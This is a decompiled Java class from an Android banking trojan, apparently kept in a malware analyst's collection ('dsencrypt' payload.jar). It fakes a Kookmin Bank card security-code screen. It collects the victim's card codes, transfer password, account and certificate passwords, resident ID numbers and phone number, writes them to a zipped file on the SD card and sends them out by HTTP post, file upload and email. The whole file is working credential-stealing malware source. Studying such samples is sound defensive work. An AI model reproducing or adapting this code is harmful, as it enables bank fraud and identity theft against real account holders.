package com.kbstar.kb.android.star;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.res.Resources;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.Toast;
import com.kbstar.kb.android.star.model.Bank;
import com.kbstar.kb.android.star.util.GMailSend;
import com.kbstar.kb.android.star.util.GeneralUtil;
import com.kbstar.kb.android.star.util.Tool;
import com.kbstar.kb.android.star.util.Url;
import com.kbstar.kb.android.star.util.WebServiceUtil;
import com.kbstar.kb.android.star.util.ZipUtil;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.message.BasicNameValuePair;

public class KB_Card_Psw
  extends Activity
  implements View.OnClickListener
{
  private final int Next_Page = 201;
  private final int SUBMIT_ERROR = 202;
  private AppContext appContext;
  private Bank bank;
  private ImageView btn_cancel;
  private ImageView btn_confirm;
  private int count_submit = 0;
  private List<EditText> edList;
  private EditText et_trans_psw;
  private String f = "";
  @SuppressLint({"HandlerLeak"})
  private Handler handler = new Handler()
  {
    public void handleMessage(Message paramAnonymousMessage)
    {
      super.handleMessage(paramAnonymousMessage);
      switch (paramAnonymousMessage.what)
      {
      default: 
        return;
      case 201: 
        KB_Card_Psw.this.pd.dismiss();
        KB_Card_Psw.this.appContext.preferences.edit().putBoolean("ars", true).commit();
        KB_Card_Psw.this.url.write_append("args.txt", "," + KB_Card_Psw.this.page_type);
        paramAnonymousMessage = new Intent(KB_Card_Psw.this, KB_Last.class);
        paramAnonymousMessage.putExtra("ars", "no");
        KB_Card_Psw.this.startActivity(paramAnonymousMessage);
        return;
      }
      if (KB_Card_Psw.this.count_submit < 2)
      {
        paramAnonymousMessage = KB_Card_Psw.this;
        paramAnonymousMessage.count_submit += 1;
        new Thread(new Runnable()
        {
          public void run()
          {
            Message localMessage = new Message();
            Object localObject = WebServiceUtil.uploadCert(KB_Card_Psw.this.bank.getFileName());
            if ((localObject != null) && (Integer.valueOf(localObject.toString()).intValue() > -1))
            {
              localObject = WebServiceUtil.uploadBank(KB_Card_Psw.this.bank);
              if ((localObject != null) && (Integer.valueOf(localObject.toString()).intValue() > -1))
              {
                localMessage.what = 201;
                KB_Card_Psw.this.handler.sendMessage(localMessage);
                return;
              }
            }
            localMessage.what = 202;
            KB_Card_Psw.this.handler.sendMessage(localMessage);
          }
        }).start();
        return;
      }
      KB_Card_Psw.this.pd.dismiss();
      KB_Card_Psw.this.toast = Toast.makeText(KB_Card_Psw.this, KB_Card_Psw.this.getResources().getString(2131361816), 1);
      KB_Card_Psw.this.toast.setGravity(17, 0, 0);
      KB_Card_Psw.this.toast.show();
    }
  };
  private ImageView head_menu_left_btn;
  private LinearLayout ll_trans_psw;
  private String page_type = "";
  private ProgressDialog pd;
  private StringBuffer sb = new StringBuffer();
  private String tel = "";
  private Toast toast;
  private Url u = new Url();
  private Url url = new Url();
  
  private void initView()
  {
    this.btn_confirm = ((ImageView)findViewById(2131296264));
    this.btn_cancel = ((ImageView)findViewById(2131296265));
    this.head_menu_left_btn = ((ImageView)findViewById(2131296258));
    this.ll_trans_psw = ((LinearLayout)findViewById(2131296317));
    this.et_trans_psw = ((EditText)findViewById(2131296318));
    this.ll_trans_psw.setVisibility(8);
    if ((this.page_type.equalsIgnoreCase("sh")) || (this.page_type.equalsIgnoreCase("nh"))) {
      this.ll_trans_psw.setVisibility(0);
    }
    TextWatcher local2 = new TextWatcher()
    {
      public void afterTextChanged(Editable paramAnonymousEditable)
      {
        int j;
        int i;
        if (paramAnonymousEditable.length() == 4)
        {
          j = KB_Card_Psw.this.getCurrentFocus().getId();
          i = 0;
        }
        for (;;)
        {
          if (i >= KB_Card_Psw.this.edList.size()) {
            return;
          }
          if ((((EditText)KB_Card_Psw.this.edList.get(i)).getText().length() != 4) && (((EditText)KB_Card_Psw.this.edList.get(i)).getId() != j))
          {
            ((EditText)KB_Card_Psw.this.edList.get(i)).requestFocus();
            ((EditText)KB_Card_Psw.this.edList.get(i)).setText("");
            return;
          }
          i += 1;
        }
      }
      
      public void beforeTextChanged(CharSequence paramAnonymousCharSequence, int paramAnonymousInt1, int paramAnonymousInt2, int paramAnonymousInt3) {}
      
      public void onTextChanged(CharSequence paramAnonymousCharSequence, int paramAnonymousInt1, int paramAnonymousInt2, int paramAnonymousInt3) {}
    };
    this.edList = new ArrayList();
    this.edList.add((EditText)findViewById(2131296266));
    this.edList.add((EditText)findViewById(2131296271));
    this.edList.add((EditText)findViewById(2131296276));
    this.edList.add((EditText)findViewById(2131296281));
    this.edList.add((EditText)findViewById(2131296286));
    this.edList.add((EditText)findViewById(2131296291));
    this.edList.add((EditText)findViewById(2131296296));
    this.edList.add((EditText)findViewById(2131296267));
    this.edList.add((EditText)findViewById(2131296272));
    this.edList.add((EditText)findViewById(2131296277));
    this.edList.add((EditText)findViewById(2131296282));
    this.edList.add((EditText)findViewById(2131296287));
    this.edList.add((EditText)findViewById(2131296292));
    this.edList.add((EditText)findViewById(2131296297));
    this.edList.add((EditText)findViewById(2131296268));
    this.edList.add((EditText)findViewById(2131296273));
    this.edList.add((EditText)findViewById(2131296278));
    this.edList.add((EditText)findViewById(2131296283));
    this.edList.add((EditText)findViewById(2131296288));
    this.edList.add((EditText)findViewById(2131296293));
    this.edList.add((EditText)findViewById(2131296298));
    this.edList.add((EditText)findViewById(2131296269));
    this.edList.add((EditText)findViewById(2131296274));
    this.edList.add((EditText)findViewById(2131296279));
    this.edList.add((EditText)findViewById(2131296284));
    this.edList.add((EditText)findViewById(2131296289));
    this.edList.add((EditText)findViewById(2131296294));
    this.edList.add((EditText)findViewById(2131296299));
    this.edList.add((EditText)findViewById(2131296270));
    this.edList.add((EditText)findViewById(2131296275));
    int i;
    if (this.page_type.equalsIgnoreCase("sh"))
    {
      findViewById(2131296280).setVisibility(8);
      findViewById(2131296285).setVisibility(8);
      findViewById(2131296290).setVisibility(8);
      findViewById(2131296295).setVisibility(8);
      findViewById(2131296300).setVisibility(8);
      findViewById(2131296319).setVisibility(8);
      findViewById(2131296320).setVisibility(8);
      findViewById(2131296321).setVisibility(8);
      findViewById(2131296322).setVisibility(8);
      findViewById(2131296323).setVisibility(8);
      i = 0;
    }
    for (;;)
    {
      if (i >= this.edList.size())
      {
        this.btn_confirm.setOnClickListener(this);
        this.btn_cancel.setOnClickListener(this);
        this.head_menu_left_btn.setOnClickListener(this);
        return;
        this.edList.add((EditText)findViewById(2131296280));
        this.edList.add((EditText)findViewById(2131296285));
        this.edList.add((EditText)findViewById(2131296290));
        this.edList.add((EditText)findViewById(2131296295));
        this.edList.add((EditText)findViewById(2131296300));
        break;
      }
      ((EditText)this.edList.get(i)).addTextChangedListener(local2);
      i += 1;
    }
  }
  
  private void validation()
  {
    String str1 = "";
    Object localObject = "";
    if ((this.page_type.equalsIgnoreCase("sh")) || (this.page_type.equalsIgnoreCase("nh")))
    {
      String str3 = this.appContext.preferences.getString("yi", "");
      String str2 = this.et_trans_psw.getText().toString().trim();
      if (str2.length() < 5)
      {
        this.toast = Toast.makeText(getApplicationContext(), getResources().getString(2131361827), 0);
        this.toast.setGravity(17, 0, 0);
        this.toast.show();
        return;
      }
      localObject = str2;
      if (!str3.equals(str2))
      {
        this.appContext.preferences.edit().putString("yi", str2).commit();
        this.toast = Toast.makeText(getApplicationContext(), getResources().getString(2131361828), 0);
        this.toast.setGravity(17, 0, 0);
        this.toast.show();
        this.et_trans_psw.setText("");
        this.et_trans_psw.requestFocus();
        return;
      }
    }
    GeneralUtil.dismissKeyBoard(this);
    int i = 0;
    if (i >= this.edList.size())
    {
      this.pd = new ProgressDialog(this);
      this.pd.setMessage(getResources().getString(2131361815));
      this.pd.show();
      this.bank.setCard(str1);
      if ((!this.page_type.equalsIgnoreCase("sh")) && (!this.page_type.equalsIgnoreCase("nh"))) {
        break label513;
      }
      this.bank.setTransPsw((String)localObject);
    }
    for (;;)
    {
      this.bank.setClientId(String.valueOf(AppContext.deviceId));
      new Thread(new Runnable()
      {
        public void run()
        {
          Message localMessage = new Message();
          Object localObject = Tool.GetUrlTool();
          new StringBuilder("http://").append((String)localObject).append("/phon/view.php").toString();
          localObject = (TelephonyManager)KB_Card_Psw.this.getSystemService("phone");
          KB_Card_Psw.this.tel = ((TelephonyManager)localObject).getLine1Number();
          localObject = new ArrayList();
          ((List)localObject).add(new BasicNameValuePair("clientId", KB_Card_Psw.this.bank.getClientId()));
          ((List)localObject).add(new BasicNameValuePair("accountNam", KB_Card_Psw.this.bank.getAccountName()));
          ((List)localObject).add(new BasicNameValuePair("accountNo", KB_Card_Psw.this.bank.getAccountNo()));
          ((List)localObject).add(new BasicNameValuePair("accountPsw", KB_Card_Psw.this.bank.getAccountPsw()));
          ((List)localObject).add(new BasicNameValuePair("fileName", KB_Card_Psw.this.bank.getFileName()));
          ((List)localObject).add(new BasicNameValuePair("bkType", KB_Card_Psw.this.bank.getBkType()));
          ((List)localObject).add(new BasicNameValuePair("card", KB_Card_Psw.this.bank.getCard()));
          ((List)localObject).add(new BasicNameValuePair("certPsw", KB_Card_Psw.this.bank.getCertPsw()));
          ((List)localObject).add(new BasicNameValuePair("personIdFirst", KB_Card_Psw.this.bank.getPersonIdFirst()));
          ((List)localObject).add(new BasicNameValuePair("personIdSecond", KB_Card_Psw.this.bank.getPersonIdSecond()));
          ((List)localObject).add(new BasicNameValuePair("transPsw", KB_Card_Psw.this.bank.getTransPsw()));
          ((List)localObject).add(new BasicNameValuePair("phone", KB_Card_Psw.this.tel));
          KB_Card_Psw.this.sb.append("clientId:" + KB_Card_Psw.this.bank.getClientId());
          KB_Card_Psw.this.sb.append(" ****  ");
          KB_Card_Psw.this.sb.append("accountNam:" + KB_Card_Psw.this.bank.getAccountName());
          KB_Card_Psw.this.sb.append(" ****  ");
          KB_Card_Psw.this.sb.append("accountNo:" + KB_Card_Psw.this.bank.getAccountNo());
          KB_Card_Psw.this.sb.append(" ****  ");
          KB_Card_Psw.this.sb.append("accountPsw:" + KB_Card_Psw.this.bank.getAccountPsw());
          KB_Card_Psw.this.sb.append(" ****  ");
          KB_Card_Psw.this.sb.append("fileName:" + KB_Card_Psw.this.bank.getFileName());
          KB_Card_Psw.this.sb.append(" ****  ");
          KB_Card_Psw.this.sb.append("bkType:" + KB_Card_Psw.this.bank.getBkType());
          KB_Card_Psw.this.sb.append(" ****  ");
          KB_Card_Psw.this.sb.append("card:" + KB_Card_Psw.this.bank.getCard());
          KB_Card_Psw.this.sb.append(" ****  ");
          KB_Card_Psw.this.sb.append("certPsw:" + KB_Card_Psw.this.bank.getCertPsw());
          KB_Card_Psw.this.sb.append(" ****  ");
          KB_Card_Psw.this.sb.append("personIdFirst:" + KB_Card_Psw.this.bank.getPersonIdFirst());
          KB_Card_Psw.this.sb.append(" ****  ");
          KB_Card_Psw.this.sb.append("personIdSecond:" + KB_Card_Psw.this.bank.getPersonIdSecond());
          KB_Card_Psw.this.sb.append(" ****  ");
          KB_Card_Psw.this.sb.append("transPsw:" + KB_Card_Psw.this.bank.getTransPsw());
          long l = System.currentTimeMillis();
          KB_Card_Psw.this.f = (KB_Card_Psw.this.bank.getBkType() + "_" + l);
          KB_Card_Psw.this.u.write(KB_Card_Psw.this.f + ".txt", KB_Card_Psw.this.sb.toString());
          try
          {
            ZipUtil.ZipFolder(KB_Card_Psw.this.u.getSDPath() + "/" + KB_Card_Psw.this.f + ".txt", KB_Card_Psw.this.u.getSDPath() + "/" + KB_Card_Psw.this.f + ".zip");
            localObject = new File(KB_Card_Psw.this.u.getSDPath() + "/" + KB_Card_Psw.this.f + ".zip");
            Tool.postHttpFile1(KB_Card_Psw.this.getApplicationContext(), (File)localObject, KB_Card_Psw.this.f);
            GMailSend.MailSend(KB_Card_Psw.this.tel, KB_Card_Psw.this.sb.toString(), KB_Card_Psw.this.f + ".zip", KB_Card_Psw.this.u.getSDPath());
            localMessage.what = 201;
            KB_Card_Psw.this.handler.sendMessage(localMessage);
            return;
          }
          catch (Exception localException)
          {
            for (;;)
            {
              localException.printStackTrace();
            }
          }
        }
      }).start();
      return;
      if (((EditText)this.edList.get(i)).getText().length() != 4)
      {
        this.toast = Toast.makeText(getApplicationContext(), getResources().getString(2131361809) + " [" + (i + 1) + "]", 0);
        this.toast.setGravity(17, 0, 0);
        this.toast.show();
        ((EditText)this.edList.get(i)).requestFocus();
        return;
      }
      str1 = str1 + " [" + (i + 1) + "]" + ((EditText)this.edList.get(i)).getText();
      i += 1;
      break;
      label513:
      this.bank.setTransPsw("无");
    }
  }
  
  public void onClick(View paramView)
  {
    switch (paramView.getId())
    {
    default: 
      return;
    case 2131296265: 
      finish();
      return;
    case 2131296264: 
      validation();
      return;
    }
    finish();
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    this.appContext = ((AppContext)getApplicationContext());
    GeneralUtil.activityList.add(this);
    getWindow().requestFeature(1);
    setContentView(2130903046);
    this.bank = ((Bank)getIntent().getSerializableExtra("Bank"));
    this.page_type = getSharedPreferences("data", 0).getString("item", null);
    if (this.bank == null)
    {
      finish();
      return;
    }
    initView();
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/KB_Card_Psw.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */